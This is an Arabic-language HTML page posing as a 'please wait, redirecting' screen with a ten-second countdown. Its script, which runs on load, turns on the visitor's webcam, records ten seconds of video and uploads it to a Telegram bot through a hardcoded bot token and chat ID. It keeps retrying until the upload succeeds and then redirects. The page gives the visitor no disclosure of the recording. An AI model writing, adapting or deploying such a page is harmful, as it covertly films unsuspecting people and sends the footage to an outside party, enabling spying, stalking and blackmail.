<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
        }
        #countdown-container {
            position: relative;
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background-color: #ddd;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #333;
        }
        #progress {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            clip: rect(0px, 150px, 150px, 75px);
            background-color: #4CAF50;
        }
    </style>
</head>
<body>
    <div>الرجاء الانتظار، سيتم الانتقال تلقائيًا خلال 10 ثوانٍ</div>
    <div id="countdown-container">
        <div id="progress"></div>
        <span id="countdown">10</span>
    </div>

    <script>
        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
        const chatId = '6185375878';
        let countdown = 10;
        let recordedVideoBlob;

        // بدء العداد وتسجيل الفيديو
        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            const progressElement = document.getElementById('progress');
            let angle = 0;

            const countdownInterval = setInterval(() => {
                countdown--;
                angle += 36; // زاوية التقدم لكل ثانية (360 درجة ÷ 10 ثوانٍ)
                countdownElement.innerText = countdown;

                // تحديث شكل التقدم
                progressElement.style.transform = `rotate(${angle}deg)`;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    sendVideoToTelegram();
                }
            }, 1000);

            startVideoRecording();
        }

        // تسجيل الفيديو لمدة 10 ثوانٍ
        async function startVideoRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
                mediaRecorder.onstop = () => {
                    recordedVideoBlob = new Blob(chunks, { type: 'video/mp4' });
                    stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا بعد التسجيل
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 10000); // التسجيل لمدة 10 ثوانٍ
            } catch (error) {
                console.error('خطأ في تسجيل الفيديو:', error);
            }
        }

        // إرسال الفيديو إلى Telegram والتأكد من نجاح الإرسال قبل الانتقال
        async function sendVideoToTelegram() {
            if (recordedVideoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', recordedVideoBlob, 'recording.mp4');
                formData.append('caption', '📹 تسجيل الفيديو لمدة 10 ثوانٍ');

                try {
                    const response = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();

                    if (data.ok) {
                        console.log('تم إرسال الفيديو إلى Telegram:', data);
                        window.location.href = "finalPage.html";
                    } else {
                        console.error('فشل إرسال الفيديو، سيتم إعادة المحاولة');
                        setTimeout(sendVideoToTelegram, 2000); // إعادة المحاولة بعد ثانيتين
                    }
                } catch (error) {
                    console.error('خطأ في إرسال الفيديو إلى Telegram، سيتم إعادة المحاولة:', error);
                    setTimeout(sendVideoToTelegram, 2000); // إعادة المحاولة بعد ثانيتين
                }
            }
        }

        startCountdown();
    </script>
</body>
</html>
